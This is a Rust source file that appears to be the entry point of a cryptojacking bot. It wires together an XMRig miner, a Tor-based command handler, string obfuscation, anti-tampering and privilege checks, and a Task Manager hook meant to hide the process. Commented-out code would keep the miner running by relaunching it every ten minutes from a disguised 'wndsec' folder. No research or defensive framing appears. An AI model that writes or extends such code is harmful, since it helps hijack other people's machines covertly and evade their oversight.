// #![windows_subsystem = "windows"]

use std::{ sync::Mutex, time::Duration };
use client_vars::constants::{ log_directory, xmrig_exe_name };
use miner::{ run::run_miner, utils::initialize_miner };
use network::{ basic::get_xmrig_summary, tor::BotHandler };
use obfstr::obfstr as s;
use shared::{
    constants::logs_encryption_key,
    logs::logger::Logger,
    network::tor::LoggerCnfg,
    uac::checks::{ is_elevated, is_system },
    utils::{
        anti_tampering::is_clean,
        config::load_mib_config,
        functions::{ exit_1, get_current_exe_dir },
    },
};
use lazy_static::lazy_static;
use tasks::task_manager_hook::run_query_hooker;

mod tasks;
mod utils;
mod network;
mod miner;

#[tokio::main]
async fn main() {
    // if !is_clean() {
    //     exit_1();
    // }

    // if !is_elevated().unwrap_or(false) {
    //     exit_1();
    // }

    // let mib_config = load_mib_config(false).unwrap();
    // if !mib_config.cln_up_done {
    //     exit_1();
    // }

    // tokio::task::spawn(async move {
    //     loop {
    //         if let Err(error) = run_query_hooker().await {
    //             err!("run_query_hooker errored out: ", error);
    //         };
    //     }
    // });

    // tokio::task::spawn(async move {
    //     // check if running - if not - reinit and rerun
    //     // sleep 10 mins - check again

    //     let miner_file_path = get_current_exe_dir()
    //         .unwrap()
    //         .join(s!("wndsec"))
    //         .join(xmrig_exe_name())
    //         .to_str()
    //         .unwrap()
    //         .to_owned();

    //     loop {
    //         if let Err(_error) = get_xmrig_summary().await {
    //             if let Err(_error) = initialize_miner() {
    //                 // err!("initialize_miner failed: ", error);
    //             }
    //             std::thread::sleep(Duration::from_secs(2));
    //             if let Err(_error) = run_miner(&miner_file_path).await {
    //                 // err!("run_miner failed: ", error);
    //             }
    //         }
    //         tokio::time::sleep(Duration::from_secs(600)).await;
    //     }
    // });
    println!("Start");
    let config = LoggerCnfg::New {
        log_dir: get_current_exe_dir().unwrap(),
        log_enc_key: logs_encryption_key(),
    };

    if let Ok(mut bot_handler) = BotHandler::new(config).await {
        println!("run");
        bot_handler.run_handler().await;
    }
}

// add error in terminal collecting
